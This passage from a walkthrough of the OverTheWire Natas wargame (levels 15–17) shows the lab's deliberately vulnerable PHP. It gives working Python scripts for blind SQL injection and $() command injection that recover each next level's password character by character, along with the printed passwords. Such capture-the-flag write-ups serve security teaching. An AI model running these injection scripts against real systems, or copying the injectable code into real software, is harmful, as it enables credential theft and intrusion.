<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm">CREATE TABLE `users` (</span>
</span><span class='line'><span class="cm">  `username` varchar(64) DEFAULT NULL,</span>
</span><span class='line'><span class="cm">  `password` varchar(64) DEFAULT NULL</span>
</span><span class='line'><span class="cm">);</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;natas15&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">&#39;natas15&#39;</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * from users where username=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Executing query: </span><span class="si">$query</span><span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;This user exists.&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;This user doesn&#39;t exist.&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Error in query.&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>We can again see the query that is being run on the backend by manipulating the URL: <a href="http://natas15.natas.labs.overthewire.org/index.php?debug=True&amp;username=natas16">http://natas15.natas.labs.overthewire.org/index.php?debug=True&amp;username=natas16</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Executing query: SELECT * from users where username="natas16"
</span><span class='line'>This user exists.</span></code></pre></td></tr></table></div></figure>


<p>So, this time the SQL code checks for the existence of a user and reports whether that username exists or not. We can&rsquo;t inject in a way that would directly give us the password like previously, but we know the query will be run against the <em>users</em> table, which contains both usernames and passwords. There is a way to bruteforce the natas16 password by forcing the database to check it one character at a time and report True of False (user exists or not). The statement to inject will look like this: <code>username=natas16" AND password LIKE BINARY &ldquo;a%&rdquo;&mdash; </code>. Testing it in the URL (don&rsquo;t forget to encode the space after comments), you can check one character a time until the database respons with the user exists message. Then you know the password begins with the respective character and you can move on to the next. But the password is 32 characters long, so we will do it in an automated way!</p>

<p>Some explanation about the SQL keywords:</p>

<ul>
<li><p>The AND operator displays a record if both the first condition AND the second condition are true.</p></li>
<li><p>The LIKE operator is used in a WHERE clause to search for a specified pattern in a column.</p></li>
<li><p>The BINARY operator casts the string following it to a binary string. This is an easy way to force a column comparison to be done byte by byte rather than character by character. This causes the comparison to be case sensitive even if the column is not defined as BINARY or BLOB. BINARY also causes trailing spaces to be significant.</p></li>
<li><p><strong>%</strong>     A substitute for zero or more characters</p></li>
</ul>


<p>If you run this query with the debug parameter set, you will see how it looks like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Executing query: SELECT * from users where username="natas16"and password like binary "a%"-- "</span></code></pre></td></tr></table></div></figure>


<p>When the entire statement is evaluated, the query will return True of False, and we will use that information to build the password. Here&rsquo;s a Python script to do the job:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">passwd</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="c"># this is the range of possible values</span>
</span><span class='line'><span class="n">testchars</span> <span class="o">=</span> <span class="s">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>
</span><span class='line'><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="k">while</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">testchars</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># binary keyword forces a case sensitive search</span>
</span><span class='line'>    <span class="n">query</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="s">&quot;natas16</span><span class="se">\&quot;</span><span class="s"> AND password like BINARY </span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">+</span> \
</span><span class='line'>                 <span class="n">passwd</span> <span class="o">+</span> <span class="n">testchars</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">+</span> <span class="s">&quot;%</span><span class="se">\&quot;</span><span class="s"> -- &quot;</span><span class="p">,</span><span class="n">submit</span><span class="o">=</span><span class="s">&quot;Check existence&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># example query: {&#39;username&#39;: &#39;natas16&quot; AND password like BINARY &quot; a%&quot; -- &#39;}</span>
</span><span class='line'>    <span class="n">guess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://natas15.natas.labs.overthewire.org/&#39;</span><span class="p">,</span> \
</span><span class='line'>                      <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas15&#39;</span><span class="p">,</span> <span class="s">&#39;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&#39;</span><span class="p">),</span>\
</span><span class='line'>                      <span class="n">params</span> <span class="o">=</span> <span class="n">query</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># example encoded query (automatic encoding):</span>
</span><span class='line'>    <span class="c"># username=natas16%22+AND+password+like+BINARY+%22+a%25%22+--+</span>
</span><span class='line'>    <span class="k">if</span> <span class="s">&quot;This user exists&quot;</span> <span class="ow">in</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">passwd</span> <span class="o">+=</span> <span class="n">testchars</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">passwd</span>
</span><span class='line'>        <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>        <span class="k">continue</span>
</span><span class='line'>    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure>


<p>The passwod will be slowly built like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>W
</span><span class='line'>Wa
</span><span class='line'>WaI
</span><span class='line'>WaIH
</span><span class='line'>WaIHE
</span><span class='line'>WaIHEa
</span><span class='line'>WaIHEac
</span><span class='line'>WaIHEacj
</span><span class='line'>WaIHEacj6
</span><span class='line'>WaIHEacj63
</span><span class='line'>WaIHEacj63w
</span><span class='line'>WaIHEacj63wn
</span><span class='line'>WaIHEacj63wnN
</span><span class='line'>WaIHEacj63wnNI
</span><span class='line'>WaIHEacj63wnNIB
</span><span class='line'>WaIHEacj63wnNIBR
</span><span class='line'>WaIHEacj63wnNIBRO
</span><span class='line'>WaIHEacj63wnNIBROH
</span><span class='line'>WaIHEacj63wnNIBROHe
</span><span class='line'>WaIHEacj63wnNIBROHeq
</span><span class='line'>WaIHEacj63wnNIBROHeqi
</span><span class='line'>WaIHEacj63wnNIBROHeqi3
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m5
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m5n
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m5nh
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m5nhm
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</span></code></pre></td></tr></table></div></figure>


<p>And now we have the password for natas16: <code>WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</code></p>

<h3>Level 16</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas16.png" title="natas16" alt="natas 16"></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="nv">$key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;needle&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;needle&quot;</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/[;|&amp;`\&#39;&quot;]/&#39;</span><span class="p">,</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;Input contains an illegal character!&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;grep -i </span><span class="se">\&quot;</span><span class="si">$key</span><span class="se">\&quot;</span><span class="s2"> dictionary.txt&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Right, this is similar to level 9. This time, however, there is character filtering in place, so we can&rsquo;t use any of these: <code>;|&amp;`\&lsquo;&ldquo;</code>. So there is no way to inject or chain commands..at the first glance! There is one useful character that is not filtered! The dollar sign! This is used in the bash shell in the same way as the backticks: for <a href="http://bash.cyberciti.biz/guide/Command_substitution">command substitution</a></p>

<p>Basically, you can use it to run a command and store its output in a variable or display it with the <em>echo</em> command. It looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# echo $(whoami)
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>So we want to bruteforce the password in the way we did before. Whatever we run with the $() command will be placed inside the $key variable, which is passed to grep against the dictionary file. If there is a match, the words containing it are displayed, else nothing is displayed. This is the behavior we will exploit for True and False values with our injection</p>

<p>Let&rsquo;s test it first. In the form field, I injected <code>$(echo matrix)</code>, and that return all the matches for that word:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Output:
</span><span class='line'>
</span><span class='line'>matrix
</span><span class='line'>matrix's
</span><span class='line'>matrixes</span></code></pre></td></tr></table></div></figure>


<p>The code executed by the server ends up being <code>grep -i matrix dictionary.txt</code>. Now, if I inject a non-existent word, there is no output. So to check for the password, we will use a nested grep inside the main grep, that will look like this: <code>$(grep -E ^a.* /etc/natas_webpass/natas17)matrix</code>. This checks if the password starts with a, and we will then iterate over all characters. Let&rsquo;s imagine what happens if a is the first character of the password:</p>

<ul>
<li><p>the nested grep that we injected returns a, which is appended to the word we passed after, matrix in this case, so the server-side grep looks for the word amatrix in the dictionary file, and since that doesn&rsquo;t exist, nothing is returned. So we know that if nothing is returned, we had a match</p></li>
<li><p>there is no match for the nested grep, so the matrix word remains unchanged, and the server returns all the matrix words, which means there was no match for the character we tried in the password</p></li>
</ul>


<p>To automate the injection process, I wrote a Python script again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">testchars</span> <span class="o">=</span> <span class="s">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>
</span><span class='line'><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="n">passwd</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="n">index</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">testchars</span><span class="p">:</span>
</span><span class='line'>            <span class="n">passwd</span> <span class="o">+=</span> <span class="n">char</span>
</span><span class='line'>            <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;needle&#39;</span><span class="p">:</span> <span class="s">&quot;$(grep -E ^&quot;</span> <span class="o">+</span> <span class="n">passwd</span> <span class="o">+</span> <span class="s">&quot;.* /etc/natas_webpass/natas17)matrix&quot;</span><span class="p">,</span> <span class="s">&#39;submit&#39;</span><span class="p">:</span> <span class="s">&#39;Search&#39;</span><span class="p">}</span>
</span><span class='line'>            <span class="n">guess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://natas16.natas.labs.overthewire.org/?needle=&#39;</span><span class="p">,</span>
</span><span class='line'>                                 <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas16&#39;</span><span class="p">,</span> <span class="s">&#39;WaIHEacj63wnNIBROHeqi3p9t0m5nhmh&#39;</span><span class="p">),</span>
</span><span class='line'>                                 <span class="n">params</span> <span class="o">=</span> <span class="n">payload</span><span class="p">)</span>
</span><span class='line'>            <span class="n">response</span> <span class="o">=</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;Trying: &quot;</span><span class="p">,</span> <span class="n">passwd</span>
</span><span class='line'>            <span class="k">if</span> <span class="s">&quot;matrix&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
</span><span class='line'>                <span class="k">print</span> <span class="s">&quot;Password: &quot;</span><span class="p">,</span> <span class="n">passwd</span>
</span><span class='line'>                <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>                <span class="k">break</span>
</span><span class='line'>            <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># keep the chars that matched</span>
</span><span class='line'>                <span class="n">passwd</span> <span class="o">=</span> <span class="n">passwd</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Done! Password: &quot;</span><span class="p">,</span> <span class="n">passwd</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Password:  8
</span><span class='line'>Password:  8P
</span><span class='line'>Password:  8Ps
</span><span class='line'>Password:  8Ps3
</span><span class='line'>Password:  8Ps3H
</span><span class='line'>Password:  8Ps3H0
</span><span class='line'>Password:  8Ps3H0G
</span><span class='line'>Password:  8Ps3H0GW
</span><span class='line'>Password:  8Ps3H0GWb
</span><span class='line'>Password:  8Ps3H0GWbn
</span><span class='line'>Password:  8Ps3H0GWbn5
</span><span class='line'>Password:  8Ps3H0GWbn5r
</span><span class='line'>Password:  8Ps3H0GWbn5rd
</span><span class='line'>Password:  8Ps3H0GWbn5rd9
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7G
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7Gm
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmA
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAd
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdg
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQ
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQN
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNd
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdk
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkh
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhP
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
</span><span class='line'>Done! Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw</span></code></pre></td></tr></table></div></figure>


<p>Cool, we have the password for the next level: <code>8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw</code></p>

<h3>Level 17</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas15.png" title="natas17" alt="natas 17"></p>

<p>Again, a level similar to a previous one. This will be another case of SQL injection:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm">CREATE TABLE `users` (</span>
</span><span class='line'><span class="cm">  `username` varchar(64) DEFAULT NULL,</span>
</span><span class='line'><span class="cm">  `password` varchar(64) DEFAULT NULL</span>
</span><span class='line'><span class="cm">);</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;natas17&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">&#39;natas17&#39;</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * from users where username=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Executing query: </span><span class="si">$query</span><span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">//echo &quot;This user exists.&lt;br&gt;&quot;;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">//echo &quot;This user doesn&#39;t exist.&lt;br&gt;&quot;;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">//echo &quot;Error in query.&lt;br&gt;&quot;;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


